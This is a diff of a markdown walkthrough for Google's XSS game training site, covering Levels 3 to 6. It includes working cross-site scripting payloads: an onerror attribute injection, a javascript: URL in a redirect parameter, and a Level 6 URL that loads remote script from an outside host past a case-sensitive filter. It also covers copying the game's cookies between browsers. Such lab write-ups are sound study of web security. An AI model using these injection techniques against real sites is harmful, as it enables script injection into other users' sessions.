@@ -34,11 +34,15 @@ I could not figure out a way to inject the code directly into the URL.
 
 ## [Level 3](https://xss-game.appspot.com/level3)
 To get past Level 3 I had to use Safari (10.0.3) because Firefox (51.0.1) and Chrome (55.0.2883.95) both prevented the injection of a space, encoded or not, after the single quote. Here is the full URL I used to successfully pass Level 3 with Safari:
-```
+```code
 https://xss-game.appspot.com/level3/frame' onerror="alert('xss')"
 ```
-But I wanted to keep working with Firefox. So I stole Safari's cookie called "level3".
-I configured Safari to use the Burp proxy, then copied the name and value of the third cookie:
+But I wanted to keep working with Firefox. So I copied Safari's cookie called "level3". To do this:
+
+1. I configured Safari to use the Burp proxy.
+1. I exploited Level 1 and 2 as described above.
+1. I visited the URL for level three, with the attack code appended, as shown above. When the `alert()` popped up, the game set a new cookie called `level3`.
+1. I copied the name and value of the third cookie:
 ```code
 level1=f148716ef4ed1ba0f192cde4618f8dc5;
 level2=b5e530302374aa71cc3028c810b63641;
@@ -48,7 +52,14 @@ Here's how to set a new cookie in FF or Chrome using the console in dev tools:
 ```javascript
 document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
 ```
-Now you can advance to level 4 in FF or Chrome.
+Now you can advance to level 4 in FF or Chrome. But, unlike the other cookies set by the game, the manually-set cookie will be set to expire at the end of the session. So if you close your browser tab for `xss-game.appspot.com`, then open a new tab to that website, you'll find that you can't go to Level 4. This is because the `level3` cookie expired when the previous session ended. So the better way to manually set that cookie is to include a value for the `expires` attribute:
+
+```javascript
+document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa;expires='Fri, 22 July 2022 5:34:56 GMT'";
+```
+
+You can set several other cookie attributes like this, but the [specification][2] for `document.cookie` is very detailed and specific about syntax.
+
 
 ## [Level 4](https://xss-game.appspot.com/level4)
 
@@ -69,23 +80,23 @@ To get through this level you have to do these in order:
 
    In the URL, change the value of `next` from `confirm` to `javascript:alert(1)`.
 3. Click the "Go" button, which is part of the fake browser. Clicking this button changes the value of the `href` for the "Next >>" link. Before you click the "Go" button, if you hover over the "Next >>" link, the target shown in the hoverbox is:
-   
+
    ```code
    https://xss-game.appspot.com/level5/frame/confirm
    ```
-   
+
    And in fact the `href` value is a relative link, simply `confirm`. After changing `confirm` to `javascript:alert(1)`, the URL is now set to this:
-   
+
    ```code
    https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
    ```
-   
+
    Click the "Go" button. Now if you hover over that same "Next >>" link, the target shown in the hoverbox is now just:
-   
+
    ```
    javascript:alert(1)
    ```
-   
+
    By the user having edited the URL manually, that link's `href` value had changed to the user's input.
 4. Click the "Next >>" link. The alert pops up and the game sets a new cookie and displays a banner saying that you may now go on to the next level.
 
@@ -98,3 +109,4 @@ For Level 6 I had to look up the answer. It turns out that the regex was not cas
 https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
 ```
 [1]: https://xss-game.appspot.com/
+[2]: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
